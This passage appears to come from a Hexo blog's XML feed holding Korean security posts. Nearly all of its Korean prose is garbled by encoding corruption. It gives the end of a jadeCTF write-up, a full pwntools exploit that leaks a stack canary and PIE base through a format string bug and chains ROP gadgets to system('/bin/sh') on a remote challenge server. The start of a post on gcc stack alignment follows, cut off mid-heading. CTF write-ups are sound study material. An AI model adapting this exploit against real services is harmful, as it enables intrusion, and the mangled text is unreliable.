ì—†ìœ¼ë‹ˆ 2ë°”ì´íŠ¸ë§Œ ë®ì„ ìˆ˜ ìžˆë‹¤. retë¥¼ 2ë°”ì´íŠ¸ë§Œ ë®ìœ¼ë©´ ì–´ì°¨í”¼ ëì— nullì´ ìžë™ìœ¼ë¡œ ë¶™ê¸° ë•Œë¬¸ì— 1&#x2F;16ì˜ í™•ë¥ ë¡œ ë‚´ê°€ ì›í•˜ëŠ” í•¨ìˆ˜ë¡œ íë¦„ì„ ëŒë¦´ ìˆ˜ ìžˆê²Œ ëœë‹¤.</p><p>canary leakì„ ì„±ê³µí•˜ê³  íë¦„ ëŒë¦¬ëŠ” ê²ƒë„ ì„±ê³µí•˜ë©´ ì´ì œ pie leakì„ í•˜ë©´ ëœë‹¤. pie leakë„ canaryë¥¼ leakí•œ ê²ƒê³¼ ë™ì¼í•˜ê²Œ ì§„í–‰í•˜ë©´ ëœë‹¤. ë‹¤ë§Œ ì°¨ì´ì ì€ canaryëŠ” ripë¥¼ ë°”ê¾¸ë©´ì„œ ê²€ì¦ì´ ë°”ë¡œ ë˜ì–´ì„œ ì•Œ ìˆ˜ ìžˆëŠ” ë°˜ë©´ì— pieëŠ” offsetê³¼ í•¨ê»˜ ì¶œë ¥í•´ì£¼ë©´ì„œ pie ì£¼ì†Œì¸ ê²ƒì„ leakí•˜ë©´ ëœë‹¤.</p><p>ê·¸ë ‡ê²Œ êµ¬í•œ leakí•  pie offsetì€ 85ì´ë‹¤.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><p>ë¬¸ì œ í’€ ë•Œì˜ ê¸°ì–µì„ ì‚´ë¦¬ê³  ì‹¶ì–´ì„œ ê·¸ ë•Œ ìž‘ì„±í–ˆë˜ ìµìŠ¤ ì½”ë“œë¥¼ ê·¸ëŒ€ë¡œ ì˜¬ë¦°ë‹¤.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;34.76.206.46&#x27;</span>, <span class="number">10003</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">off = <span class="number">30</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        off = <span class="number">77</span></span><br><span class="line">        find_canary = <span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(off)+<span class="string">&#x27;$p&#x27;</span></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;]?\n&#x27;</span>, find_canary)</span><br><span class="line">        <span class="comment">#off = off+1</span></span><br><span class="line">        </span><br><span class="line">        p.recvuntil(<span class="string">&#x27;: &#x27;</span>)</span><br><span class="line">        leak = p.recvline()</span><br><span class="line">        canary = <span class="built_in">int</span>(leak[<span class="number">2</span>:],<span class="number">16</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#print(off, hex(canary))</span></span><br><span class="line">        </span><br><span class="line">        log.info(<span class="built_in">hex</span>(canary))</span><br><span class="line">        </span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;correct?\n&#x27;</span>, <span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x210</span>-<span class="number">0x8</span>)</span><br><span class="line">        payload += p64(canary)</span><br><span class="line">        payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x8</span></span><br><span class="line">        payload += <span class="string">b&#x27;\x78\x15&#x27;</span></span><br><span class="line"></span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;:\n&#x27;</span>, payload)</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;]?\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="comment">#p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">        p = remote(<span class="string">&#x27;34.76.206.46&#x27;</span>, <span class="number">10003</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">off = 30</span></span><br><span class="line"><span class="string">while 1:</span></span><br><span class="line"><span class="string">    try:</span></span><br><span class="line"><span class="string">        off = 85 </span></span><br><span class="line"><span class="string">        find_pie = &#x27;%&#x27;+str(off)+&#x27;$p&#x27;</span></span><br><span class="line"><span class="string">        p.sendline(find_pie)</span></span><br><span class="line"><span class="string">        #off = off+1</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        p.recvuntil(&#x27;: &#x27;)</span></span><br><span class="line"><span class="string">        leak = p.recvline()</span></span><br><span class="line"><span class="string">        pie = int(leak[2:],16)</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        print(off, hex(pie))</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        p.sendlineafter(&#x27;correct?\n&#x27;, b&#x27;yes&#x27;)</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        payload = b&#x27;&#x27;</span></span><br><span class="line"><span class="string">        payload += b&#x27;A&#x27; * (0x210-0x8)</span></span><br><span class="line"><span class="string">        payload += p64(canary)</span></span><br><span class="line"><span class="string">        payload += b&#x27;B&#x27; * 0x8</span></span><br><span class="line"><span class="string">        payload += b&#x27;\x78\x15&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        p.sendlineafter(&#x27;:\n&#x27;, payload)</span></span><br><span class="line"><span class="string">        p.recvuntil(&#x27;]?\n&#x27;)</span></span><br><span class="line"><span class="string">        continue</span></span><br><span class="line"><span class="string">    except Exception as e:</span></span><br><span class="line"><span class="string">        print(e)</span></span><br><span class="line"><span class="string">        p.close()</span></span><br><span class="line"><span class="string">        #p = process(&#x27;./chall&#x27;)</span></span><br><span class="line"><span class="string">        p = remote(&#x27;34.76.206.46&#x27;, 10003)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line"><span class="comment">#exit(0)</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;%85$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">pie = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0x1577</span></span><br><span class="line">info(<span class="built_in">hex</span>(pie))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;ct?\n&#x27;</span>, <span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = pie+<span class="number">0x1663</span></span><br><span class="line">ret = pie+<span class="number">0x909</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x210</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x8</span></span><br><span class="line"><span class="comment">#payload += p64(ret)</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(pie + elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(pie + elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(pie + elf.symbols[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvline()</span></span><br><span class="line"><span class="comment">#leak = int(p.recv(14)[:-1].decode(), 16)</span></span><br><span class="line">leak = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&#x27;puts leak :: &#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line"></span><br><span class="line"><span class="comment">#puts 6a0</span></span><br><span class="line"><span class="comment">#gets d90</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">libc_base = leak - libc.symbols[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">info(&#x27;libc base :: &#x27;+ hex(libc_base))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">system = libc_base + libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">binsh = libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">system = leak - <span class="number">0x2a300</span></span><br><span class="line">binsh = leak + <span class="number">0x11d7b7</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;asdf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;ct?\n&#x27;</span>, <span class="string">b&#x27;yes&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x210</span>-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x8</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jadeCTF&#123;sh3llc0ding_but_w1th_4_tw1st&#125;</span><br></pre></td></tr></table></figure><h2 id="tmi"><a href="#tmi" class="headerlink" title="tmi"></a>tmi</h2><p>ë¡¸ì—… ì ìœ¼ë‹ˆê¹Œ ì´ ë¬¸ì œëŠ” ë§¤ìš° ê°„ë‹¨í•œ ë¬¸ì œìž„ì„ ê¹¨ë‹¬ì•˜ë‹¤. ë¶€ë„ëŸ½ì§€ë§Œ pieê°€ ê±¸ë ¤ìžˆëŠ”ë° ì–´ë–»ê²Œ ROPë¥¼ í•´ì•¼í• ì§€ ê³ ë¯¼ì„ í–ˆë‹¤. ì¼ë‹¨ localì—ì„œ ì§„í–‰í•  ë•Œë„ ë§ˆì§€ë§‰ 2 ë°”ì´íŠ¸ë§Œ ë®ì„ ìƒê°ì„ ëª»í–ˆì—ˆê³ , local í›„ì— remoteì˜ libcê°€ ë‹¤ë¥¸ë° pieê°€ ê±¸ë ¤ìžˆëŠ”ë° ê·¸ê±¸ ì–´ë–»ê²Œ ì•Œì•„ë‚´ì•¼ í•˜ëŠ”ì§€.. ë“±ë“± ê³ ë¯¼ì„ ê½¤ë‚˜ í–ˆë‹¤. (offsetì„ ë¸Œí¬í•˜ë©´ ëœë‹¤.)</p><p>ì´ ë¬¸ì œ ë•ì— ì£¼ì†Œ ì¼ë¶€ë§Œ ë®ì„ ìˆ˜ ìžˆë‹¤ëŠ” ìƒê°ê³¼ ë£¨í”„, try-except ë“±ì„ ì´ìš©í•˜ì—¬ offsetì„ êµ¬í•˜ëŠ” ê³¼ì •ì„ ë°°ìš¸ ìˆ˜ ìžˆì—ˆë‹¤.</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Jade </category>
          
      </categories>
      
      
        <tags>
            
            <tag> canary </tag>
            
            <tag> fsb </tag>
            
            <tag> pie </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Stack Alignment in 32-bit program</title>
      <link href="/221020-32bit_stack_aligned/"/>
      <url>/221020-32bit_stack_aligned/</url>
      
        <content type="html"><![CDATA[<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>ë¶€ì œ: gcc ì˜µì…˜ ì¤‘ í•˜ë‚˜ì¸ <code>-mpreferred-stack-boundary</code>ì— ëŒ€í•˜ì—¬</p><p>Pwnable ë¬¸ì œë¥¼ í’€ë‹¤ê°€ ë¬¸ë“ 32bit ROPë¥¼ ì‚´ì§ ìžŠì—ˆë‹¤ëŠ” ê¸°ë¶„ì´ ë“¤ì—ˆë‹¤. (â€¦) ì˜ˆì œ ì½”ë“œë¥¼ ìž‘ì„±í•˜ê³  ê·¸ê²ƒì„ ìµìŠ¤í•˜ë ¤ê³  í–ˆìœ¼ë‚˜ ìƒê°ëŒ€ë¡œ ìž˜ ë˜ì§€ ì•Šì•„ ë¶„ì„ì„ ì§„í–‰í•˜ì˜€ë‹¤. í•¨ìˆ˜ í”„ë¡¤ë¡œê·¸ì™€ ì—í•„ë¡œê·¸ì— ë‚¯ì„  ì½”ë“œê°€ ì¶”ê°€ë˜ì–´ ìžˆì—ˆê³ , ì´ ë•Œë¬¸ì— bufì™€ sfp ì‚¬ì´ì— ë¬´ì–¸ì˜ ê°’ì´ ë“¤ì–´ìžˆì—ˆë‹¤. ë¶„ì„ ê²°ê³¼, ì›ì¸ì€ gcc ì˜µì…˜ ì¤‘ í•˜ë‚˜ì¸ <code>-mpreferred-stack-boundary</code> ë•Œë¬¸ìž„ì„ ì•Œê²Œë˜ì—ˆë‹¤. </p><p>Pwnableì—ì„œì˜ 32bit ë°”ì´ë„ˆë¦¬ëŠ” (ê±°ì˜) ëŒ€ë¶€ë¶„ <code>-mpreferred-stack-boundary=2</code> ì˜µì…˜ì„ ì£¼ê³  ì»´íŒŒì¼ì„ í•œë‹¤.</p><h2 id="gcc-option-mpreferred-stack-boundary-N"><a href="#gcc-option-mpreferred-stack-boundary-N" class="headerlink" title="gcc option: -mpreferred-stack-boundary=N"></a>gcc option: <code>-mpreferred-stack-boundary=N</code></h2><p>Attempt to keep the stack boundary aligned to a 2 raised to num byte boundary.<br>If â€˜-mpreferred-stack-boundaryâ€™ is not specified, the default is 4 (16 bytes or<br>128 bits).</p><ul><li>ì¶œì²˜: <a href="https://gcc.gnu.org/onlinedocs/gcc-12.2.0/gcc.pdf">https://gcc.gnu.org/onlinedocs/gcc-12.2.0/gcc.pdf</a></li></ul><p>mainì„ í¬í•¨í•˜ì—¬ ì´í›„ì— ë¶ˆë¦¬ëŠ” ëª¨ë“  í•¨ìˆ˜ë“¤ì˜ ìŠ¤íƒí”„ë ˆìž„ì—ì„œ ê°€ìž¥ ë‚®ì€ ì£¼ì†Œê°€ 2^N ì— ë°°ìˆ˜ê°€ ë˜ë„ë¡ alignì„ í•´ì¤€ë‹¤.</p><p>ì»´íŒŒì¼í•  ë•Œ ì € ì˜µì…˜ì„ ì£¼ì§€ ì•Šìœ¼ë©´ <code>-mpreferred-stack-boundary=4</code>ê°€ ë””í´íŠ¸ë¡œ ë“¤ì–´ê°€ê²Œ ëœë‹¤. ê·¸ëž˜ì„œ ìŠ¤íƒ alignì´ 16ë°”ì´íŠ¸ë¡œ ë§žì¶°ì§€ê²Œ ëœë‹¤. </p><p>ê´€ë ¨ ì½”ë“œëŠ” ì•„ëž˜ì™€ ê°™ë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* Validate -mpreferred-stack-boundary= value or default it to</span></span><br><span class="line"><span class="comment">    PREFERRED_STACK_BOUNDARY_DEFAULT.  */</span></span><br><span class="line"> ix86_preferred_stack_boundary = PREFERRED_STACK_BOUNDARY_DEFAULT;</span><br><span class="line"> <span class="keyword">if</span> (opts_set-&gt;x_ix86_preferred_stack_boundary_arg)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="type">int</span> min = TARGET_64BIT_P (opts-&gt;x_ix86_isa_flags)? <span class="number">3</span> : <span class="number">2</span>;</span><br><span class="line">     <span class="type">int</span> max = TARGET_SEH ? <span class="number">4</span> : <span class="number">12</span>;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (opts-&gt;x_ix86_preferred_stack_boundary_arg &lt; min</span><br><span class="line">  || opts-&gt;x_ix86_preferred_stack_boundary_arg &gt; max)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (min == max)</span><br><span class="line">    error (<span class="string">&quot;%&lt;-mpreferred-stack-boundary%&gt; is not supported &quot;</span></span><br><span class="line">   <span class="string">&quot;for this target&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    error (<span class="string">&quot;%&lt;-mpreferred-stack-boundary=%d%&gt; is not between %d and %d&quot;</span>,</span><br><span class="line">   opts-&gt;x_ix86_preferred_stack_boundary_arg, min, max);</span><br><span class="line">&#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">ix86_preferred_stack_boundary</span><br><span class="line">  = (<span class="number">1</span> &lt;&lt; opts-&gt;x_ix86_preferred_stack_boundary_arg) * BITS_PER_UNIT;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><ul><li><a href="https://github.com/gcc-mirror/gcc/blob/releases/gcc-12/gcc/config/i386/i386-options.cc#L2463">https://github.com/gcc-mirror/gcc/blob/releases/gcc-12/gcc/config/i386/i386-options.cc#L2463</a></li></ul><h1 id="Default-Stack-aligned-to-a-16-byte-boundary"><a href="#Default-Stack-aligned-to-a-16-byte-boundary" class="headerlink" title="(Default) Stack aligned to a 16-byte boundary."></a>(Default) Stack aligned to a 16-byte boundary.</h1><h3 id="disassemble-main"><a href="#disassemble-main" class="headerlink" title="disassemble main"></a>disassemble main</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x080491f1</span> &lt;+<span class="number">0</span>&gt;:lea    ecx,[esp+<span class="number">0x4</span>]</span><br><span class="line"><span class="number">0x080491f5</span> &lt;+<span class="number">4</span>&gt;:and    esp,<span class="number">0xfffffff0</span></span><br><span class="line"><span class="number">0x080491f8</span> &lt;+<span class="number">7</span>&gt;:  push   DWORD PTR [ecx<span class="number">-0x4</span>]</span><br><span class="line"><span class="number">0x080491fb</span> &lt;+<span class="number">10</span>&gt;:push   ebp</span><br><span class="line"><span class="number">0x080491fc</span> &lt;+<span class="number">11</span>&gt;:mov    ebp,esp</span><br><span class="line"><span class="number">0x080491fe</span> &lt;+<span class="number">13</span>&gt;:push   ecx</span><br><span class="line"><span class="number">0x080491ff</span> &lt;+<span class="number">14</span>&gt;:sub    esp,<span class="number">0x44</span></span><br><span class="line"><span class="number">0x08049202</span> &lt;+<span class="number">17</span>&gt;:sub    esp,<span class="number">0x4</span></span><br><span class="line"><span class="number">0x08049205</span> &lt;+<span class="number">20</span>&gt;:push   <span class="number">0x40</span></span><br><span class="line"><span class="number">0x08049207</span> &lt;+<span class="number">22</span>&gt;:push   <span class="number">0x0</span></span><br><span class="line"><span class="number">0x08049209</span> &lt;+<span class="number">24</span>&gt;:lea    eax,[ebp<span class="number">-0x48</span>]</span><br><span class="line"><span class="number">0x0804920c</span> &lt;+<span class="number">27</span>&gt;:push   eax</span><br><span class="line"><span class="number">0x0804920d</span> &lt;+<span class="number">28</span>&gt;:call   <span class="number">0x8049080</span> &lt;<span class="built_in">memset</span>@plt&gt;</span><br><span class="line">...</span><br><span class="line"><span class="number">0x08049255</span> &lt;+<span class="number">100</span>&gt;:mov    ecx,DWORD PTR [ebp<span class="number">-0x4</span>]</span><br><span class="line"><span class="number">0x08049258</span> &lt;+<span class="number">103</span>&gt;:leave  </span><br><span class="line"><span class="number">0x08049259</span> &lt;+<span class="number">104</span>&gt;:lea    esp,[ecx<span class="number">-0x4</span>]</span><br><span class="line"><span class="number">0x0804925c</span> &lt;+<span class="number">107</span>&gt;:ret  </span><br></pre></td></tr></table></figure><h3 id="1-í”„ë¡¤ë¡œê·¸-ì „-1"><a href="#1-í”„ë¡¤ë¡œê·¸-ì „-1" class="headerlink" title="1. í”„ë¡¤ë¡œê·¸ ì „ (1)"></a>1. í”„ë¡¤ë¡œê·¸ ì „ (1)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">â†’  <span class="number">0x080491f1</span> &lt;+<span class="number">0</span>&gt; :lea    ecx,[esp+<span class="number">0x4</span>]</span><br><span class="line">   <span class="number">0x080491f5</span> &lt;+<span class="number">4</span>&gt; :and    esp,<span class="number">0xfffffff0</span></span><br><span class="line">   <span class="number">0x080491f8</span> &lt;+<span class="number">7</span>&gt; :push   DWORD PTR [ecx<span class="number">-0x4</span>]</span><br><span class="line">   <span class="number">0x080491fb</span> &lt;+<span class="number">10</span>&gt;:push   ebp</span><br><span class="line">   <span class="number">0x080491fc</span> &lt;+<span class="number">11</span>&gt;:mov    ebp,esp</span><br><span class="line">   <span class="number">0x080491fe</span> &lt;+<span class="number">13</span>&gt;:push   ecx  </span><br></pre></td></tr></table></figure><p>ì‹¤í–‰í•˜ê³  ë‚œ í›„.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ecx  : 0xffffd960</span><br><span class="line">$esp  : 0xffffd95c</span><br></pre></td></tr></table></figure><p>ecx ë ˆì§€ìŠ¤í„°ë¥¼ ì‚¬ìš©í•˜ë ¤ê³  í•˜ëŠ”ê±¸ê¹Œ?</p><h3 id="2-í”„ë¡¤ë¡œê·¸-ì „-2"><a href="#2-í”„ë¡¤ë¡œê·¸-ì „-2" class="headerlink" title="2. í”„ë¡¤ë¡œê·¸ ì „ (2)"></a>2. í”„ë¡¤ë¡œê·¸ ì „ (2)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">   <span class="number">0x080491f1</span> &lt;+<span class="number">0</span>&gt; :lea    ecx,[esp+<span class="number">0x4</span>]</span><br><span class="line">â†’  <span class="number">0x080491f5</span> &lt;+<span class="number">4</span>&gt; :and    esp,<span class="number">0xfffffff0</span></span><br><span class="line">   <span class="number">0x080491f8</span> &lt;+<span class="number">7</span>&gt; :push   DWORD PTR [ecx<span class="number">-0x4</span>]</span><br><span class="line">   <span class="number">0x080491fb</span> &lt;+<span class="number">10</span>&gt;:push   ebp</span><br><span class="line">   <span class="number">0x080491fc</span> &lt;+<span class="number">11</span>&gt;:mov    ebp,esp</span><br><span class="line">   <span class="number">0x080491fe</span> &lt;+<span class="number">13</span>&gt;:push   ecx  </span><br></pre></td></tr></table></figure><p>ì‹¤í–‰í•˜ê³  ë‚œ í›„.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ecx  : 0xffffd960</span><br><span class="line">$esp  : 0xffffd950</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0xffffd950â”‚+0x0000: 0x00000000â† $esp</span><br><span class="line">0xffffd954â”‚+0x0004: 0x00000000</span><br><span class="line">0xffffd958â”‚+0x0008: 0x8048354  â†’  &quot;__libc_start_main&quot;</span><br><span class="line">0xffffd95câ”‚+0x000c: 0xf7c1f119  â†’   add esp, 0x10</span><br><span class="line">0xffffd960â”‚+0x0010: 0x00000001</span><br><span class="line">0xffffd964â”‚+0x0014: 0xffffda14  â†’  0xffffdb90  â†’  &quot;/home/jir4vvit/study/rop32/chall&quot;</span><br><span class="line">0xffffd968â”‚+0x0018: 0xffffda1c  â†’  0xffffdbb1  â†’  &quot;SHELL=/bin/bash&quot;</span><br><span class="line">0xffffd96câ”‚+0x001c: 0xffffd980  â†’  0xf7e1fe34  â†’  0x0021fd4c</span><br><span class="line">0xffffd970â”‚+0x0020: 0xf7e1fe34  â†’  0x0021fd4c</span><br><span class="line">0xffffd974â”‚+0x0024: 0x80491f1  â†’  &lt;main+0&gt; lea ecx, [esp+0x4]</span><br></pre></td></tr></table></figure><p>32bit í”„ë¡œê·¸ëž¨ì—ì„  block ë‹¨ìœ„ê°€ 4ë°”ì´íŠ¸ì´ê¸° ë•Œë¬¸ì— ì»´íŒŒì¼ëŸ¬(gcc)ê°€ and ì—°ì‚°ìœ¼ë¡œ espë¥¼ 16ì— alignì‹œí‚¤ëŠ” ëª¨ìŠµì„ í™•ì¸í•  ìˆ˜ ìžˆë‹¤.</p><h4 id="ecx-ë ˆì§€ìŠ¤í„°ë¥¼-ì™œ-push-í–ˆì„ê¹Œ"><a href="#ecx-ë 